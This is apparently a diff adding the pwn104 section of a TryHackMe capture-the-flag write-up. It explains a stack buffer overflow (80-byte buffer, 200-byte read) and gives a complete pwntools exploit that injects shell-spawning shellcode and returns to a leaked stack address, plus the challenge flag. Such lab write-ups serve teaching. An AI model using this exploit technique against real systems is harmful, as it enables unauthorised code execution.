@@ -195,6 +195,101 @@ THM{w3lC0m3_4Dm1N}
 
 # Challenge 4 - pwn104
 
+Let's start this one by running the program!
+
+```bash
+┌──(kali㉿kali)-[~/CTF/THM/pwn104]
+└─$ ./pwn104-1644300377109.pwn104 
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 104          
+
+I think I have some super powers 💪
+especially executable powers 😎💥
+
+Can we go for a fight? 😏💪
+I'm waiting for you at 0x7fff6e63d650
+```
+
+If you run the program more than 1 time, you will probably notice that the address given by the program is changing each time. To know why, let's step into the reverse part to see it's decompiled code. The following is the code.
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char buf[80]; // [rsp+0h] [rbp-50h] BYREF
+
+  setup(argc, argv, envp);
+  banner();
+  puts(aIThinkIHaveSom);
+  puts(aEspeciallyExec);
+  puts(aCanWeGoForAFig);
+  printf("I'm waiting for you at %p\n", buf);
+  return read(0, buf, 200uLL);
+}
+```
+
+In this program, we don't have any vulnerable function to call or return to, so we can obtain the shell only by the shellcode. Look the code above, I notice that there's a vulnerability at the read function. The vulnerability is not caused by the function per se; rather, it's caused by the programmer.
+
+If we check the manual of the `read()` function in C, we can see that this function will read up to a count that set by the programmer. So it's designed to be a secure function, not like the `gets()` function.
+
+![read(2) — Linux manual page](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240728225456197.png)
+
+But in this case, the program designer allocated a buffer with a size of 80 bytes and set the `read()` function can read up to 200 bytes. That's where the vuln came from. Since 200 is way larger than 80, we can still input some malicious stuff to pwn this binary. The PoC is as follows (the segmentation fault).
+
+![PoC](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240728232628241.png)
+
+The first step is to find the offset to overwrite the RIP register. Here I still use the cyclic tool to generate an input with the length of 100 bytes by the command `cyclic 100`.
+
+![GDB](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240728231622992.png)
+
+Then we use `cyclic -l laaaaaa` to lookup the offset, which is 88 in my case. After getting the offset, we can start writing the exploit. Here's how it will go.
+
+1. Get the leak address given by the program.
+2. Generate the shellcode by shellcraft.
+3. Inject the shellcode to the buf.
+4. Control the execution flow to retrun to the shellcode.
+
+To generate the correct shellcode, we need to know some information of the remote system, including the architecture and the OS.
+
+```bash
+┌──(kali㉿kali)-[~/CTF/THM/pwn104]
+└─$ file pwn104-1644300377109.pwn104 
+pwn104-1644300377109.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped
+```
+
+So in this case, we need to set the architecture to AMD64 and the OS to linux. Here's the exploit.
+
+```python
+from pwn import *
+
+r = remote("10.10.107.8", 9004)
+r.recvuntil(b"I'm waiting for you at ")
+
+offset = 88
+leak_addr = r.recvline().decode()
+leak_addr = int(leak_addr, 16)
+print(f"Leak address: {hex(leak_addr)}")
+
+# Set the architecture and os for the shellcode crafting
+context.arch = "amd64"
+context.os = "linux"
+shellcode = asm(shellcraft.sh())
+
+padding = b"A" * (offset - len(shellcode))
+
+payload = shellcode + padding + p64(leak_addr)
+
+r.sendline(payload)
+r.interactive()
+```
+
+By running this, you can get a shell and free to cat out the flag.txt.
+
+```txt
+THM{0h_n0o0o0o_h0w_Y0u_Won??}
+```
+
 # Challenge 5 - pwn105
 
 Let's decompile the code to see it's behavior. The following is the code decompiled by IDA.
